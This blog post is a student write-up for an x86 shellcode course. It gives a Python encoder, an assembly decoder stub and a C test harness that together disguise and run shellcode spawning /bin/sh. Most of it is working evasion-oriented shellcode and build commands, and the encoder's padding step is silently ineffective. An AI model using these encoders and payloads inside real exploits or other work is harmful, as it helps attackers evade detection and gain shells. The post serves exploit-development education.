---
title:  "SLAE x86 Assignment 4: Custom Encoding Scheme"
header:
  teaser: "/assets/images/slae32.png"
  teaser_home_page: true
categories:
  - exploit dev
classes: wide
tags:
  - exploit dev
  - slae
---

Hey guys! Welcome back! In this post, we will look at assignment 4 of the SLAE x86 certification. Let's dive right in!

## Understanding The Objective ##
This assignment requires us to write a custom encoding scheme, accompanied with a decoding stub in order for the shellcode to be executed. So this is my take on this assignment:

- First, a python script will be used to encode the shellcode. Each byte of the shellcode will be appended by 0xAA, followed by a random number.
- The decoder will be written in assembly. This decoder stub will contain our encoded shellcode. Once the shellcode has been decoded, execution will be passed to it.

So let's start with the encoder script! We will first need to extract the ```execve-stack``` shellcode:
```
kali@kali ~/Desktop/SLAEx86_Assignments/assignment4 $ objdump -d ./execve-stack|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
```

```python
#SLAE x86 Assignment 4: Custom Encoder Script
#Author: 4p0cryph0n
#Website: https://4p0cryph0n.github.io

#!/usr/bin/python

import sys
import random

execve = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")

#If length is an odd no. add a nop at the end to make even

if len(bytearray(execve)) % 2 != 0:
	bytearray(execve).append(0x90)

encoded2 = ""

#add 0xaa followed by a random byte after each byte of the shellcode

for x in bytearray(execve):

	encoded2 += '0x'
	encoded2 += '%02x,' % x
	encoded2 += '0x%02x,' % 0xAA + '0x%02x,' % random.randint(1,255)

print encoded2
```
This script will first check whether the length of the shellcode is odd or even, depending upon which it will add a ```NOP``` at the end. This is to help with encoding groups of bytes. Then, the encoding process starts, and is outputted in a format which is supported by nasm. I will manually be adding a byte at the end of this output, which will serve as a marker. This will tell our decoder stub when to stop with the decoding process. This byte will be ```\xde```.

```
kali@kali ~/Desktop/SLAEx86_Assignments/assignment4 $ python encoder.py
0x31,0xaa,0xc4,0xc0,0xaa,0xa3,0x50,0xaa,0x6d,0x68,0xaa,0x6c,0x2f,0xaa,0x66,0x2f,0xaa,0xc7,0x73,0xaa,0x74,0x68,0xaa,0xc7,0x68,0xaa,0x88,0x2f,0xaa,0xd1,0x62,0xaa,0x58,0x69,0xaa,0x5e,0x6e,0xaa,0x12,0x89,0xaa,0x65,0xe3,0xaa,0xaf,0x50,0xaa,0xf5,0x89,0xaa,0x9e,0xe2,0xaa,0x25,0x53,0xaa,0x79,0x89,0xaa,0x69,0xe1,0xaa,0x26,0xb0,0xaa,0xd6,0x0b,0xaa,0x60,0xcd,0xaa,0x54,0x80,0xaa,0xc2,

add \xde at the end
```
### Assembly time!
Okay so now we have our output. Let's write the decoder stub. The idea is to essentially skip the two bytes added, and eliminate them to arrive at our decoded shellcode:
```nasm
; SLAE Assignment 4: Custom Decoder (Linux/x86)
; Author:  4p0cryph0n
; Website:  https://4p0cryph0n.github.io

global _start

section .text

_start:

	jmp short call_shellcode

decoder:
	pop esi
	lea edi, [esi +1]
	xor eax, eax
	mov al, 1
	xor ebx, ebx

decode:
	mov bl, byte [esi + eax]
	xor bl, 0xde
	jz short EncodedShellcode
	mov bl, byte [esi + eax + 2]
	mov byte [edi], bl
	inc edi
	add al, 3
	jmp short decode


call_shellcode:

	call decoder
	EncodedShellcode: db 0x31,0xaa,0xc4,0xc0,0xaa,0xa3,0x50,0xaa,0x6d,0x68,0xaa,0x6c,0x2f,0xaa,0x66,0x2f,0xaa,0xc7,0x73,0xaa,0x74,0x68,0xaa,0xc7,0x68,0xaa,0x88,0x2f,0xaa,0xd1,0x62,0xaa,0x58,0x69,0xaa,0x5e,0x6e,0xaa,0x12,0x89,0xaa,0x65,0xe3,0xaa,0xaf,0x50,0xaa,0xf5,0x89,0xaa,0x9e,0xe2,0xaa,0x25,0x53,0xaa,0x79,0x89,0xaa,0x69,0xe1,0xaa,0x26,0xb0,0xaa,0xd6,0x0b,0xaa,0x60,0xcd,0xaa,0x54,0x80,0xaa,0xc2, 0xde
```
The address of our encoded shellcode is first popped into ```esi``` using the ```JMP-CALL-POP``` technique. ```edi``` is loaded with the address of the second byte. A counter is initialized with ```eax```, which will be used to keep track of the closest byte next.

The second byte is then stored in ```ebx```, and the instruction after that runs a check for whether we have reached the end. In that case, we jump and pass execution. Otherwise, we move the value of the next important byte in ```ebx```, which is at ```[esi + eax + 2]```. This is because we have two junk bytes. We move the important byte in place of the second byte, and we increment the counter that keeps track of the important bytes.

We add 3 to the counter that keeps track of the closest byte next, and we continue this process until the end is reached.

Alright! Let's extract this shellcode and test it out. Pay close attention to the ```objdump``` command though:
```
kali@kali ~/Desktop/SLAEx86_Assignments/assignment4 $ objdump -d ./decoder|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-7 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
"\xeb\x1d\x5e\x8d\x7e\x01\x31\xc0\xb0\x01\x31\xdb\x8a\x1c\x06\x80\xf3\xde\x74\x10\x8a\x5c\x06\x02\x88\x1f\x47\x04\x03\xeb\xed\xe8\xde\xff\xff\xff\x31\xaa\xc4\xc0\xaa\xa3\x50\xaa\x6d\x68\xaa\x6c\x2f\xaa\x66\x2f\xaa\xc7\x73\xaa\x74\x68\xaa\xc7\x68\xaa\x88\x2f\xaa\xd1\x62\xaa\x58\x69\xaa\x5e\x6e\xaa\x12\x89\xaa\x65\xe3\xaa\xaf\x50\xaa\xf5\x89\xaa\x9e\xe2\xaa\x25\x53\xaa\x79\x89\xaa\x69\xe1\xaa\x26\xb0\xaa\xd6\x0b\xaa\x60\xcd\xaa\x54\x80\xaa\xc2\xde"
```

```c
#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\xeb\x1d\x5e\x8d\x7e\x01\x31\xc0\xb0\x01\x31\xdb\x8a\x1c\x06\x80\xf3\xde\x74\x10\x8a\x5c\x06\x02\x88\x1f\x47\x04\x03\xeb\xed\xe8\xde\xff\xff\xff\x31\xaa\xc4\xc0\xaa\xa3\x50\xaa\x6d\x68\xaa\x6c\x2f\xaa\x66\x2f\xaa\xc7\x73\xaa\x74\x68\xaa\xc7\x68\xaa\x88\x2f\xaa\xd1\x62\xaa\x58\x69\xaa\x5e\x6e\xaa\x12\x89\xaa\x65\xe3\xaa\xaf\x50\xaa\xf5\x89\xaa\x9e\xe2\xaa\x25\x53\xaa\x79\x89\xaa\x69\xe1\xaa\x26\xb0\xaa\xd6\x0b\xaa\x60\xcd\xaa\x54\x80\xaa\xc2\xde";
main()
{

        printf("Shellcode Length:  %d\n", strlen(code));

        int (*ret)() = (int(*)())code;

        ret();

}
```
Let's compile and run this:
```
kali@kali ~/Desktop/SLAEx86_Assignments/assignment4 $ gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
shellcode.c:6:1: warning: return type defaults to ‘int’ [-Wimplicit-int]
    6 | main()
      | ^~~~
kali@kali ~/Desktop/SLAEx86_Assignments/assignment4 $ ./shellcode
Shellcode Length:  112
$
```
And our shell executes!

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification.

http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/

Student ID: SLAE - 1534
